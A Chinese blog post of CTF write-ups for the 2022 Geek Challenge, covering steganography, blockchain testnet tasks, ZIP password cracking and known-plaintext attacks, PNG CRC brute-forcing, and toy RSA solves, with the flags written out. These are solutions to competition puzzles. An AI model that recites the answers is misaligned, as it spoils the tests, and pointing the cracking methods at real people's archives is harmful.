<p>​	<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122032651976.png" alt="image-20221122032651976"></p>
<hr>
<p>==<em>额，以下部分我也不知道是啥，来源于极客开始当天用海报地址打开后获取的信息解出的内容，可能是师傅搞错题了？</em>==</p>
<p>记得好像就在网页的源码里有如下这串base64密文</p>
<p>通过base64解码得到：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221021194118163.png" alt="image-20221021194118163"></p>
<p>FLAG： SYC{Fever_k1ng_want_to_get_mOre_g1rlFr1end}</p>
<hr>
<h3 id="0-哪里有0-流口水"><a href="#0-哪里有0-流口水" class="headerlink" title="0?哪里有0[流口水]"></a>0?哪里有0[流口水]</h3><h4 id="0宽度隐写"><a href="#0宽度隐写" class="headerlink" title="0宽度隐写"></a>0宽度隐写</h4><p>将信息以不可间没有宽度的形式隐藏在文本中，<a class="link" target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/index.html">详见<i class="fas fa-external-link-alt"></i></a></p>
<p>本题选中全部文本：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122015912109.png" alt="image-20221122015912109"></p>
<p>用vim查看：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221028093949500.png" alt="image-20221028093949500"></p>
<p>用在线解密网址</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122020356792.png" alt="image-20221122020356792"></p>
<p>flag：SYC{sycl0ver_no_gaylabs}</p>
<h3 id="Transfer"><a href="#Transfer" class="headerlink" title="Transfer"></a>Transfer</h3><p>区块链的第一题</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122020916414.png" alt="image-20221122020916414"></p>
<h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><p>根据hint可知本题需要向0x2b2E23ceC9921288f63F60A839E2B28235bc22ad这个钱包地址发送至少0.01ETH@goerli,这里的ETH@goerli中的ETH指的是以太坊（相信大家都听说过，其中一种加密货币）<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122021405647.png" alt="image-20221122021405647"></p>
<p>而goerli则是以太坊中的一个测试网络，众说周知以太币是很贵的，但是本题是使用的测试网络goerli中的货币，这个币是可以白嫖的，使用过几种方法获取goerli币，有些地方可以直接领，还有的地方可以通过发推来获取，这里找到一个<a class="link" target="_blank" rel="noopener" href="https://goerli-faucet.pk910.de/">地址<i class="fas fa-external-link-alt"></i></a>可以挖矿获得goerli币（这个比较快，也很直接）</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122022116622.png" alt="image-20221122022116622"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122022301228.png" alt="image-20221122022301228"></p>
<p>如上图就开始挖币了，当符合自己所需时按stop即可，约数秒后你的钱包将会收到相应的币</p>
<p>经过以上，知道如何获取币，那么如何配置钱包？</p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.coincarp.com/zh/chainlist/g%C3%B6rli/">这里<i class="fas fa-external-link-alt"></i></a>做了详细的介绍</p>
<p>最后完成以上后，只需要向指定的地址发送至少0.01ETH@goerli币，发送后将交易链接粘贴到题目指定的地址</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122023704565.png" alt="image-20221122023704565"></p>
<p>即可获取<strong>flag：SYC{F1rst_Tr4sf3r_1n_bl0ch4in}</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122023521544.png" alt="image-20221122023521544"></p>
<h3 id="Creat"><a href="#Creat" class="headerlink" title="Creat"></a>Creat</h3><p>区块链第二题</p>
<p>经过第一题对于ctf中区块链的一些了解，第二题也就很好做了</p>
<p>按照<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/KRDecad3/p/10798383.html">教程<i class="fas fa-external-link-alt"></i></a>在remixIDE上进行部署，然后再提交出交出部署的地址即可，remixIDE在线版在<a class="link" target="_blank" rel="noopener" href="https://remix.ethereum.org/">这<i class="fas fa-external-link-alt"></i></a></p>
<p>基本上照着教程一步步做就搞出来了</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221109182615878.png" alt="image-20221109182615878"></p>
<p>将部署好后的合约地址提交即可获得flag</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122025014507.png" alt="image-20221122025014507"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122024836201.png" alt="image-20221122024836201"></p>
<p>FLAG:SYC{Cr34t3_U3r_n01_c0tr4ct}</p>
<h3 id="I-got-smoke"><a href="#I-got-smoke" class="headerlink" title="I_got_smoke"></a>I_got_smoke</h3><blockquote>
<p><em>Eminem听完立马宣布退役了，他听到这首歌的时候是这么说的： “我的个人说唱生涯在听到《I Got Smoke》的时候就永远结束了。”by  –V在燃烧</em></p>
</blockquote>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p><a class="link" target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/audio/introduction/">音频隐写<i class="fas fa-external-link-alt"></i></a></p>
<p>本题是一个mp3音频文件，打开后发现中间有一段出现了杂音，由此可以猜测本题运用了音频隐写中通过频谱方式进行的隐写</p>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>用Audacity打开音频，在左边栏右键打开频谱图可看到如图图像：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221109213740314.png" alt="image-20221109213740314"></p>
<p>这个就是密码，再通过MP3Strgo解密后：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221109215012197.png" alt="image-20221109215012197"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221109214929200.png" alt="image-20221109214929200"></p>
<p><strong>flag：SYC{ltc_v_1s_0nf1r3!!}</strong></p>
<h3 id="PuPp1T的秘密"><a href="#PuPp1T的秘密" class="headerlink" title="PuPp1T的秘密"></a>PuPp1T的秘密</h3><p>secret.png是题目给出的文件，通过winhex或者010editor这些16进制查看编辑程序可以发现在结尾处有flag.zip和flag.txt<br>通过教程 <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/column/204533.html">https://www.freebuf.com/column/204533.html<i class="fas fa-external-link-alt"></i></a> 在kali中使用的相应的工具也可以查看出来，然后再通过foremost工具可以进行分离<br>这里的foremost工具好像kali不自带了，要自行安装，<br>得到的zip即文件夹中00000167.zip想要解压却发现有密码，因此猜测是上面教程后面提过的zip伪加密，进行简短的学习后大致了解了zip的结构组成，根据另行搜索的教程进行更改后似乎不对</p>
<p>同时用了ziperello这个爆破工具，按照全字符进行爆破，睡了一觉醒来发现爆破到第五位了，同时解出了<strong>密码=”lqznb”</strong></p>
<p>解压后还有一个txt和zip，txt说flag是某个学长的生日</p>
<p>再次爆破得到：<strong>021214</strong></p>
<p>解压后的flag.txt:fake flag hah,再次进行爆破</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122031810733.png" alt="image-20221122031810733"></p>
<p>然后这次的文本中有0宽度隐写，解码后得到：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221119222205989.png" alt="image-20221119222205989"></p>
<p>提示我们用口令攻击，得到密码：password</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221119230340459.png" alt="image-20221119230340459"></p>
<p>解压得到了一个图片和压缩包</p>
<p>该图片在linux下无法打开，windows下可以，可以很直接的想到是图片的长宽出了问题，拖入010editor果然：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221120011939904.png" alt="image-20221120011939904"></p>
<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35866960/article/details/116924331">正经的学习资料1<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145452/article/details/109612189?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-109612189-blog-116924331.pc_relevant_recovery_v2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-109612189-blog-116924331.pc_relevant_recovery_v2&amp;utm_relevant_index=4">正经的学习资料2<i class="fas fa-external-link-alt"></i></a></p>
<p>学习后仿写代码</p>
<p>python2的代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> struct
crc32key <span class="token operator">=</span> <span class="token number">0xF375134C</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  height <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
  <span class="token comment">#CRC: F375134C</span>
  data <span class="token operator">=</span> <span class="token string">'\x49\x48\x44\x52\x00\x00\x03\x4B'</span> <span class="token operator">+</span> height <span class="token operator">+</span> <span class="token string">'\x08\x02\x00\x00\x00'</span>
  crc32result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
  <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token string">"%02X"</span> <span class="token operator">%</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221120023012107.png" alt="image-20221120023012107"></p>
<p>得到正确的高度00000343</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221120024843523.png" alt="image-20221120024843523"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> struct
crc32key <span class="token operator">=</span> <span class="token number">0xF375134C</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  weight <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
  <span class="token comment">#CRC: F375134C</span>
  data <span class="token operator">=</span> <span class="token string">'\x49\x48\x44\x52'</span> <span class="token operator">+</span> weight <span class="token operator">+</span> <span class="token string">'\x00\x00\x03\x43\x08\x02\x00\x00\x00'</span>
  crc32result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
  <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token string">"%02X"</span> <span class="token operator">%</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> weight<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到宽度0000034B</p>
<p>修改后的图片：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/hint-new.png" alt="hint-new"></p>
<p>可知要进行明文攻击该zip</p>
<p><strong>且明文攻击的提通常后一个zip会包含前一个</strong></p>
<p>文件夹中所包含的文件，该文件在两层文件夹最初是由相同方式进行加密的，因此该文件相当于卧底间谍，通过它可以很快地解出下一层的数据</p>
<p><em>这里好像是ARCHPR这个工具版本的原因，这个太旧了，跑了很久…解密时一度怀疑自己弄错了</em></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221120202327747.png" alt="image-20221120202327747"></p>
<p>得到无密码的压缩包，解压打开flag.txt，将二进制转字符串就得到flag：</p>
<p><strong>flag：SYC{You_are_a_good_misc_misc_miscer!}</strong></p>
<h3 id="Teyvat"><a href="#Teyvat" class="headerlink" title="Teyvat"></a>Teyvat</h3><p>根据图片在b站找到一个对照表，对照后：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122200323494.png" alt="image-20221122200323494"></p>
<hr>
<hr>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ez-classic"><a href="#ez-classic" class="headerlink" title="ez_classic"></a>ez_classic</h3><p>密文:</p>
<pre class="line-numbers language-none"><code class="language-none">-.. .-.. .-. --- .-- --- - .--. -.-- .-. -.-. --- .-.. .-.. . ....<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可知是摩斯密码，通过在线解密工具</p>
<p>摩斯密码解一下在倒序即可</p>
<h3 id="StartRSA"><a href="#StartRSA" class="headerlink" title="StartRSA"></a>StartRSA</h3><h4 id="背景资料"><a href="#背景资料" class="headerlink" title="背景资料"></a>背景资料</h4><p>RSA加密算法：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/jiftle/p/7903762.html%EF%BC%88%E4%BB%8E%E6%AD%A4%E6%91%98%E6%8A%84%EF%BC%89">https://www.cnblogs.com/jiftle/p/7903762.html（从此摘抄）<i class="fas fa-external-link-alt"></i></a></p>
<p>过程：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="http://img.hexun.com/2009-06-24/118958533.jpg" alt="img"></p>
<p>算法描述：<br>（1）选择一对不同的、足够大的素数p，q。<br>（2）计算n=pq。<br>（3）计算f(n)=(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。<br>（4）找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。<br>（5）计算d，使得de≡1 mod f(n)。这个公式也可以表达为d ≡e-1 mod f(n)<br>这里要解释一下，≡是数论中表示同余的符号。公式中，≡符号的左边必须和符号右边同余，也就是两边模运算结果相同。显而易见，不管f(n)取什么值，符号右边1 mod f(n)的结果都等于1；符号的左边d与e的乘积做模运算后的结果也必须等于1。这就需要计算出d的值，让这个同余等式能够成立。<br>（6）公钥KU=(e,n)，私钥KR=(d,n)。<br>（7）加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为：<img lazyload="" src="/images/loading.svg" data-src="http://img.hexun.com/2009-06-24/118958535.gif" alt="img">。<br>（8）解密过程为：<img lazyload="" src="/images/loading.svg" data-src="http://img.hexun.com/2009-06-24/118958536.gif" alt="img">。 </p>
<p>公私钥解释：</p>
<p>fromSYCb站视频: 【【和三叶草一起打基础】—密码学入门-RSA算法】<a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1PW4y187iB?vd_source=099943867be69ccd07276a5b25b859a1!%5B%5D(https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221023115744675.png)">https://www.bilibili.com/video/BV1PW4y187iB?vd_source=099943867be69ccd07276a5b25b859a1![](https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221023115744675.png)<i class="fas fa-external-link-alt"></i></a></p>
<p><img lazyload="" src="/images/loading.svg" data-src="C:\Users\wwwzh\AppData\Roaming\Typora\typora-user-images\image-20221023120249126.png" alt="image-20221023120249126"></p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>用RSACTFTOOLs解</p>
<pre class="line-numbers language-none"><code class="language-none">python3 ./RsaCtfTool.py -n 69984814757288857831977509185208500866724771756561629279687819301222483218728663 -e 65537 --uncipher 67672845063517415442486175096448664617581579564885311842326107871805595697454701<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221024000303961.png" alt="image-20221024000303961"></p>
<p>flag:SYC{5t4rt_R5A_ls_1t_3a5y?}</p>
<h3 id="definity-EZ-RSA"><a href="#definity-EZ-RSA" class="headerlink" title="definity EZ_RSA"></a>definity EZ_RSA</h3><p>题目源代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> libnum
 <span class="token comment">#调用库</span>
flag <span class="token operator">=</span> <span class="token string">b'****hidden_message****'</span>    
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>   <span class="token comment">#生成两个质数p.q</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q   <span class="token comment">#RSA的n</span>
e <span class="token operator">=</span> <span class="token number">6</span>       <span class="token comment">#这些详细见RSA的类容</span>
m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>  <span class="token comment">#c=(m^e^)%n</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
 
<span class="token triple-quoted-string string">'''
*****************************************************
c = 50072006338339389555118552154159240037219794211505206943873038914830972293138548550568229783754227896661905769853250134014183574039535969574789925550365619292404703617997980492432173682029840923107651199593049684918577536870537471401209938966780904496397505606866028917883152417396458811357069626629334483341
n = 147194403642833538539720995718314310463580322118979932658805936518215523735242613107271741138837389303135352865058107054820876285524238471152015504027014461168105771913435200522726300893493981125032256531337768716089003105857799620333243431585087621669813946444872568719527503184655024233193716871553607529747
*****************************************************
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表示c=(m^e^)%n</p>
<p>因此此题可以通过一下方式爆破解出：</p>
<p>c=(m^e^)%n将n左移 得到c+i*n=m^e^  其中i位除数</p>
<p>因此只需要爆破i，当sqrt(c+n*i,e)位整数时即为我们所需的值</p>
<p>但是通过自己写的进行sqrt(c+n*i,e)，没记错的话好像是会因为精度问题出现错误，但是用gmpy2库的iroot进行就没问题，应该是做了优化</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> libnum <span class="token keyword">import</span><span class="token operator">*</span>   <span class="token comment">#python第三方库</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span><span class="token operator">*</span>    <span class="token comment">#python第三方库</span>

flag <span class="token operator">=</span> <span class="token string">b'xxxxxxxxx'</span>
m<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

c <span class="token operator">=</span> <span class="token number">50072006338339389555118552154159240037219794211505206943873038914830972293138548550568229783754227896661905769853250134014183574039535969574789925550365619292404703617997980492432173682029840923107651199593049684918577536870537471401209938966780904496397505606866028917883152417396458811357069626629334483341</span>
n <span class="token operator">=</span> <span class="token number">147194403642833538539720995718314310463580322118979932658805936518215523735242613107271741138837389303135352865058107054820876285524238471152015504027014461168105771913435200522726300893493981125032256531337768716089003105857799620333243431585087621669813946444872568719527503184655024233193716871553607529747</span>

i<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">#  iroot(c+i*n,6)表示将(c+i*n)开6次方</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment"># 得到31184445685322090722265606472952251987042343442391421</span>
        <span class="token keyword">break</span>
    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import binascii

print(binascii.unhexlify(hex(31184445685322090722265606472952251987042343442391421)[2:]))  上一个脚本得到的数据转字符串
# b'SYC{0ops_y0u_f1Nd_m3!}' <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>flag:SYC{0ops_y0u_f1Nd_m3!}</strong></p>
<h3 id="longbutshort"><a href="#longbutshort" class="headerlink" title="longbutshort"></a>longbutshort</h3><p>题目分析如下</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121171730316.png" alt="image-20221121171730316"></p>
<p>当时看了一下，本来准备爆破的，有点思路，于是根据题目写了一个爆破脚本</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121171924961.png" alt="image-20221121171924961"></p>
<p>但是好像超了iroot的n的界限，自己手写的脚本好像是精度的问题，</p>
<p>进行如下分析：</p>
<p>题目中已知一组p，q，a的值，并得知flag^2&lt;p</p>
<p>费马小定理可以适用于这个题：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122014753848.png" alt="image-20221122014753848"></p>
<p>原式：</p>
<p>$a(mod p)=flag^{p+1}$</p>
<p>可化为</p>
<p>$a(mod p)=flag^{2}*flag^{p-1}$</p>
<p>由于本题a不是p的倍数,根据第二种形式化简得到</p>
<p>$flag^{2}=a$</p>
<p>新脚本:</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121172031485.png" alt="image-20221121172031485"></p>
<p><strong>flag:SYC{7ca905c9dbba1ffe7ff0ee3ee93f1ac1}</strong></p>

            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul>
        <li>本文标题：极客大挑战2022</li>
        <li>本文作者：二木</li>
        <li>创建时间：2022-12-15 22:30:58</li>
        <li>
            本文链接：https://captainruler.github.io/2022/12/15/ji-ke-da-tiao-zhan-2022/
        </li>
        <li>
            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/CTF/">#CTF</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                    
                        <div class="article-next">
                            <a class="next"
                            rel="next"
                            href="/2022/12/15/csapp-di-yi-zhang-ji-suan-ji-xi-tong-man-you/"
                            >
                                <span class="title flex-center">
                                    <span class="post-nav-title-item"></span>
                                    <span class="post-nav-item">下一篇</span>
                                </span>
                                <span class="right arrow-icon flex-center">
                                <i class="fas fa-chevron-right"></i>
                                </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;评论</i>
    </div>
    

        
            

        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>目录</strong></div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">1.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">1.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.</span> <span class="nav-text">Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E5%A3%B3%EF%BC%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">查壳：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.3.2.</span> <span class="nav-text">代码分析：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">1.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HelloBinary"><span class="nav-number">1.5.</span> <span class="nav-text">HelloBinary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reverse1"><span class="nav-number">1.6.</span> <span class="nav-text">reverse1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pick-apple"><span class="nav-number">1.7.</span> <span class="nav-text">pick apple</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EzXor"><span class="nav-number">1.8.</span> <span class="nav-text">EzXor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CrazyThursday"><span class="nav-number">1.9.</span> <span class="nav-text">CrazyThursday</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ForGirls"><span class="nav-number">1.10.</span> <span class="nav-text">ForGirls</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E5%A3%B3"><span class="nav-number">1.10.1.</span> <span class="nav-text">查壳</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.10.2.</span> <span class="nav-text">逆向分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 